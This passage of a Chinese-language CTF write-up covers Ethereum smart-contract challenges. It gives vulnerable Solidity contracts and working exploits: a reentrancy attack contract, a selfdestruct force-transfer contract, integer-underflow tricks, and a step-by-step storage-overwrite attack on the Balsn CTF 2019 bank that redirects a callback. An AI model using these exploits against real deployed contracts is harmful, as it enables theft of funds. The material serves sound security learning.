def generate_eoa1():
    priv = utils.sha3(os.urandom(4096))
    addr = utils.checksum_encode(utils.privtoaddr(priv))

    while not addr.lower().endswith("b1b1"):
        priv = utils.sha3(os.urandom(4096))
        addr = utils.checksum_encode(utils.privtoaddr(priv))

    print('Address: {}\nPrivate Key: {}'.format(addr, priv.hex()))


# generate EOA with the ability to deploy contract with appendix 1b1b
def generate_eoa2():
    priv = utils.sha3(os.urandom(4096))
    addr = utils.checksum_encode(utils.privtoaddr(priv))

    while not utils.decode_addr(utils.mk_contract_address(addr, 0)).endswith("1b1b"):
        priv = utils.sha3(os.urandom(4096))
        addr = utils.checksum_encode(utils.privtoaddr(priv))


    print('Address: {}\nPrivate Key: {}'.format(addr, priv.hex()))


if __name__  == "__main__":
    if sys.argv[1] == "1":
        generate_eoa1()
    elif sys.argv[1] == "2":
        generate_eoa2()
    else:
        print("Please enter valid argument")
```

secret不用猜，直接在storage找就行。

重入攻击在withdraw函数，特别明显的重入攻击标识。

```solidity
				msg.sender.call.value(amount*100000000000000)();
        balance[msg.sender] -= amount;
```

这里的balance可以有个整数溢出，可以修改达到payforflag条件，所以重入的目的不是掏空余额而是触发这个重入。

但是合约没有balance，所以要用selfdestruct强制转过去两个eth才行。

攻击代码：

```solidity
ontract transfer_force{

    address owner;

    function () payable {
    }

    constructor()public{
        owner = msg.sender;
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    function kill(address to) public onlyOwner {
        selfdestruct(to);
    }
}

contract reentrancy{
    address bb;
    uint have_withdraw;

    function set_bb(address target)
    {
        bb=target;
    }

    function withdraw(uint amount){
        babybank(bb).withdraw(amount);
    }

    function () payable {
        if (have_withdraw==0){
            have_withdraw=1;
            babybank(bb).withdraw(2);
        }
    }

    function getflag(string md5ofteamtoken,string b64email) public{
        babybank(bb).payforflag(md5ofteamtoken,b64email);
    }
}
```

## storage

### cow

#### 代码

```solidity
pragma solidity ^0.4.2;
contract cow{
    address public owner_1;
    address public owner_2;
    address public owner_3;
    address public owner;
    mapping(address => uint) public balance;
    
    struct hacker { 
        address hackeraddress1;
        address hackeraddress2;
    }
    hacker  h;
    
    constructor()public{
        owner = msg.sender;
        owner_1 = msg.sender;
        owner_2 = msg.sender;
        owner_3 = msg.sender;
    }
    
    event SendFlag(string b64email);
    
    
    function payforflag(string b64email) public
    {
        require(msg.sender==owner_1);
        require(msg.sender==owner_2);
        require(msg.sender==owner_3);
        owner.transfer(address(this).balance);
        emit SendFlag(b64email);
    }
    
    function Cow() public payable
    {
        uint geteth=msg.value/1000000000000000000;
        if (geteth==1)
        {
            owner_1=msg.sender;
        }
    }
    
    function cov() public payable
    {
        uint geteth=msg.value/1000000000000000000;
        if (geteth<1)
        {
            hacker fff=h;
            fff.hackeraddress1=msg.sender;
        }
        else
        {
            fff.hackeraddress2=msg.sender;
        }
    }
    
    function see() public payable
    {
        uint geteth=msg.value/1000000000000000000;
        balance[msg.sender]+=geteth;
        if (uint(msg.sender) & 0xffff == 0x525b)
        {
            balance[msg.sender] -= 0xb1b1;
        }
    }
    
    function buy_own() public
    {
        require(balance[msg.sender]>1000000);
        balance[msg.sender]=0;
        owner_3=msg.sender;
    }
    
}
```

很直白，先画一个eth买owner1，然后再花一个eth，调用cov，进入else，fff没初始化，搞到owner2，然后算个后缀，整数溢出买owner3.

### bank

#### 代码

```solidity
pragma solidity ^0.4.24;

contract Bank {
    event SendEther(address addr);
    event SendFlag(address addr);
    
    address public owner;
    uint randomNumber = 0;
    
    constructor() public {
        owner = msg.sender;
    }
    
    struct SafeBox {
        bool done;
        function(uint, bytes12) internal callback;
        bytes12 hash;
        uint value;
    }
    SafeBox[] safeboxes;
    
    struct FailedAttempt {
        uint idx;
        uint time;
        bytes12 triedPass;
        address origin;
    }
    mapping(address => FailedAttempt[]) failedLogs;
    
    modifier onlyPass(uint idx, bytes12 pass) {
        if (bytes12(sha3(pass)) != safeboxes[idx].hash) {
            FailedAttempt info;
            info.idx = idx;
            info.time = now;
            info.triedPass = pass;
            info.origin = tx.origin;
            failedLogs[msg.sender].push(info);
        }
        else {
            _;
        }
    }
    
    function deposit(bytes12 hash) payable public returns(uint) {
        SafeBox box;
        box.done = false;
        box.hash = hash;
        box.value = msg.value;
        if (msg.sender == owner) {
            box.callback = sendFlag;
        }
        else {
            require(msg.value >= 1 ether);
            box.value -= 0.01 ether;
            box.callback = sendEther;
        }
        safeboxes.push(box);
        return safeboxes.length-1;
    }
    
    function withdraw(uint idx, bytes12 pass) public payable {
        SafeBox box = safeboxes[idx];
        require(!box.done);
        box.callback(idx, pass);
        box.done = true;
    }
    
    function sendEther(uint idx, bytes12 pass) internal onlyPass(idx, pass) {
        msg.sender.transfer(safeboxes[idx].value);
        emit SendEther(msg.sender);
    }
    
    function sendFlag(uint idx, bytes12 pass) internal onlyPass(idx, pass) {
        require(msg.value >= 100000000 ether);
        emit SendFlag(msg.sender);
        selfdestruct(owner);
    }

}
```

#### 分析

这题就很好玩了，是balsnctf2019的题目。

题目的漏洞点很明显，就是两个结构体变量的未初始化，可以修改storage里面的内容。

合约的slot存储布局如下：

```
-----------------------------------------------------
|     unused (12)     |          owner (20)         | <- slot 0
-----------------------------------------------------
|                 randomNumber (32)                 | <- slot 1
-----------------------------------------------------
|               safeboxes.length (32)               | <- slot 2
-----------------------------------------------------
|       occupied by failedLogs but unused (32)      | <- slot 3
-----------------------------------------------------
```

safebox存储布局如下：

```
-----------------------------------------------------
| unused (11) | hash (12) | callback (8) | done (1) |
-----------------------------------------------------
|                     value (32)                    |
-----------------------------------------------------
```

faillog存储布局如下：

```
-----------------------------------------------------
|                      idx (32)                     |
-----------------------------------------------------
|                     time (32)                     |
-----------------------------------------------------
|          origin (20)         |   triedPass (12)   |
-----------------------------------------------------
```

对于数组，假设数组所在的slot为x，那么slotx为数组的长度，下标i的元素存储的slot为：keccak(x) + i，当然需要考虑数组元素的大小。

对于字典，假设字典所在的slot为x，那么key为k的元素所在的slot为：keccak(k,x).

进入deposot函数，可以控制slot0-slot1，但是改变owner和random没有意义，因为最终要调用的sendflag函数需要的ether太大。

如果我们进入pass函数，触发faillog分支，那么就可以控制slot0-slot2。

前面分析了，slot0和slot1改变没有意义，那么剩下可选的只有slot2，slot2中存储的是safebox数组的长度，我们可以将其改成一个很大的值，如果tx.origin是一个很大的数字，那么我们就可以使得safebox数组溢出到faillog字典。

溢出到faillog字典后，将callback函数改成`emit SendFlag(msg.sender);`的地址，就可以触发这一事件拿到flag。

这里还有一点需要提的是，evm中间接跳转的地址的指令必须是一个jumpdest，这个需要在反汇编工具中找一下具体是哪个地址。

攻击流程：

1. Calculate `target = keccak256(keccak256(msg.sender||3)) + 2`.
2. Calculate `base = keccak256(2)`.
3. Calculate `idx = (target - base) // 2`.
4. If `(target - base) % 2 == 1`, then `idx += 2`, and do step 7 twice. This happens when the `triedPass` of the first element of `failedLogs` does not overlap with the `callback` variable, so we choose the second element instead.
5. If `(msg.sender << (12*8)) < idx`, then choose another player account, and restart from step 1. This happens when the overwritten length of `safeboxes` is not large enough to overlap with `failedLogs`.
6. Call `deposit(0x000000000000000000000000)` with 1 ether.
7. Call `withdraw(0, 0x111111111111110000070f00)`.
8. Call `withdraw(idx, 0x000000000000000000000000)`, and the `SendFlag` event will be emitted.

注意，chainflag的版本和原题不同，最终的70f这一个地址需要自己找到底是在哪个位置。

